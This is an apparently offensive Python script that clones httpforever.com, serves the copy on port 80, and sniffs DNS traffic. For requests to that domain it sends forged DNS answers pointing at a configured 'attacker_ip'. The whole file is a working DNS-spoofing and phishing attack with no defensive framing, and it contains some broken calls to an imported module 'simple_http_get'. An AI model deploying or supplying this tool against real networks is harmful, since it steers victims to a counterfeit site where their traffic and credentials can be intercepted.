import os
import http.client
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from http.server import SimpleHTTPRequestHandler
import socketserver
from threading import Thread
from scapy.all import *
import simple_http_get

# Configuration
attacker_ip = "192.168.2.2"  # Replace with your actual IP address
target_domain = "httpforever.com"
cloned_site_dir = "cloned_site"

# Function to clone the website
def clone_website(url, save_dir):
    if not os.path.exists(save_dir):
        os.makedirs(save_dir)

    response = simple_http_get(url, '/')
    soup = BeautifulSoup(response.text, 'html.parser')

    # Save the main page
    with open(os.path.join(save_dir, 'index.html'), 'w', encoding='utf-8') as f:
        f.write(response.text)

    # Download linked resources (CSS, JS, images)
    for tag in soup.find_all(['link', 'script', 'img']):
        src = tag.get('href') or tag.get('src')
        if src:
            src_url = urljoin(url, src)
            # Determine file path to save
            resource_path = os.path.join(save_dir, os.path.basename(urlparse(src_url).path))
            # Fetch and save resource
            try:
                res = simple_http_get(src_url, '/')
                with open(resource_path, 'wb') as res_file:
                    res_file.write(res.content)
                print(f"Downloaded: {src_url}")
            except Exception as e:
                print(f"Failed to download {src_url}: {e}")

    print("Website cloning completed.")

# Function to start the web server
def start_web_server(port, directory):
    class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=directory, **kwargs)

    handler = CustomHTTPRequestHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        print(f"Serving at port {port}")
        httpd.serve_forever()

# Function to handle DNS spoofing
def dns_spoof(pkt):
    if DNS in pkt and pkt[DNS].qr == 0:  # QR == 0 means it's a DNS request
        if target_domain in pkt[DNS].qd.qname.decode():
            print(f"Spoofing DNS request for {target_domain}")
            # Construct the DNS response
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=attacker_ip))
            send(spoofed_pkt, verbose=0)
            print(f"Sent spoofed DNS response to {pkt[IP].src}")

# Clone the website
clone_website(f"http://{target_domain}", cloned_site_dir)

# Start the web server in a separate thread
web_server_thread = Thread(target=start_web_server, args=(80, cloned_site_dir))
web_server_thread.start()

# Start DNS spoofing
print("Starting DNS spoofing...")
sniff(filter="udp port 53", prn=dns_spoof)
